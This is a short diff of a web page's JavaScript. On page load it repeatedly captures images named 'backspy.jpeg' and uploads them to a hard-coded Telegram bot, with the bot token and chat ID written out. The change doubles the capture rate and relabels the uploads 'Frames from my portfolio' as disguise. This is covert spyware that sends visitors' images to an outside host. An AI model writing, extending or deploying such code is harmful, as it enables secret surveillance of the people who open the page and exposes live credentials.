@@ -169,7 +169,7 @@ window.onload = function(){
     var formDataToUpload = new FormData(form);
     formDataToUpload.append("document", blob, "backspy.jpeg");
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669&caption=🤫`, true);
+    xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669&caption=🤫 Frames from my portfolio`, true);
     xhr.send(formDataToUpload);
   });
 }
@@ -178,6 +178,6 @@ window.onload = function(){
 	    takessend()
       console.log("sent")
 	    loop()
-    }, 1000);
+    }, 500);
 }());
 }
